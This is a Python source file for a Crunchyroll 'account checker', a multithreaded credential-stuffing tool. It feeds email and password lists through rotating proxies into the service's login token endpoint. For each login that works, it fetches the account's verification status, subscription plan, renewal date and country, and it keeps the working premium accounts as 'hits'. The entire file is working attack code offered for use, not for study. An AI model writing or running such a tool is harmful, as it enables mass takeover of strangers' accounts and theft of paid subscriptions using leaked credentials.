import requests
import uuid
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import config

class CrunchyrollChecker:
    def __init__(self, auth_header, proxies=None, threads=10):
        self.auth_header = auth_header
        self.proxies = proxies or []
        self.threads = threads
        self.results = []
        self.hits = []
        self.proxy_index = 0
        self.proxy_lock = Lock()
        self.results_lock = Lock()
        self.total_checked = 0
        self.total_hits = 0
        self.progress_callback = None
    
    def set_progress_callback(self, callback):
        self.progress_callback = callback
    
    def parse_proxy(self, proxy_str):
        try:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                server, port, user, password = parts
                return {'http': f"http://{user}:{password}@{server}:{port}", 
                       'https': f"http://{user}:{password}@{server}:{port}"}
            elif len(parts) == 2:
                server, port = parts
                return {'http': f"http://{server}:{port}", 
                       'https': f"http://{server}:{port}"}
        except:
            pass
        return None
    
    def get_next_proxy(self):
        if not self.proxies:
            return None
        with self.proxy_lock:
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return proxy
    
    def check_account(self, email, password, proxy=None):
        result = {
            'email': email,
            'password': password,
            'success': False,
            'verified': False,
            'created': '',
            'plan': 'None',
            'active': False,
            'renewal': '',
            'country': 'Unknown',
            'error': ''
        }
        
        device_id = str(uuid.uuid4())
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            'Authorization': self.auth_header,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Crunchyroll/3.54.5 Android/16'
        }
        
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "device_id": device_id,
            "device_name": "CrunchyChecker",
            "device_type": "com.crunchyroll.mobile"
        }
        
        proxies_dict = self.parse_proxy(proxy) if proxy else None
        
        try:
            response = requests.post(url, headers=headers, data=data, 
                                    proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
            
            if response.status_code == 200:
                token_data = response.json()
                access_token = token_data.get('access_token')
                
                if access_token:
                    # Get account info
                    acc_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
                    acc_headers = {'Authorization': f'Bearer {access_token}'}
                    acc_response = requests.get(acc_url, headers=acc_headers, 
                                                proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
                    
                    if acc_response.status_code == 200:
                        acc_info = acc_response.json()
                        result['verified'] = acc_info.get('email_verified', False)
                        result['created'] = acc_info.get('created', '').split('T')[0] if acc_info.get('created') else ''
                        external_id = acc_info.get('external_id')
                        
                        if external_id:
                            # Get subscription
                            sub_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}"
                            sub_response = requests.get(sub_url, headers=acc_headers,
                                                       proxies=proxies_dict, timeout=config.CHECK_TIMEOUT)
                            
                            if sub_response.status_code == 200:
                                sub_info = sub_response.json()
                                result['success'] = sub_info.get('is_active', False)
                                result['active'] = sub_info.get('is_active', False)
                                result['plan'] = sub_info.get('subscription_plan', 'None')
                                result['country'] = sub_info.get('country_code', 'Unknown')
                                result['renewal'] = sub_info.get('next_renewal_date', '').split('T')[0] if sub_info.get('next_renewal_date') else ''
                            else:
                                result['success'] = False
                                result['plan'] = 'Free'
                    else:
                        # Account exists but can't get details
                        result['success'] = True
                        result['plan'] = 'Premium (Unknown)'
                        
            elif response.status_code == 401:
                result['error'] = "Wrong password"
            elif response.status_code == 429:
                result['error'] = "Rate limited"
            else:
                result['error'] = f"HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            result['error'] = "Timeout"
        except requests.exceptions.ConnectionError:
            result['error'] = "Connection error"
        except Exception as e:
            result['error'] = str(e)[:50]
        
        return result
    
    def check_accounts(self, accounts):
        self.results = []
        self.hits = []
        self.total_checked = 0
        self.total_hits = 0
        
        def process(account):
            email, password = account
            proxy = self.get_next_proxy() if self.proxies else None
            result = self.check_account(email, password, proxy)
            
            with self.results_lock:
                self.total_checked += 1
                if result['success']:
                    self.total_hits += 1
                    self.hits.append(result)
                if self.progress_callback:
                    self.progress_callback(self.total_checked, len(accounts), result)
            
            return result
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(process, acc) for acc in accounts]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        return self.results, self.hits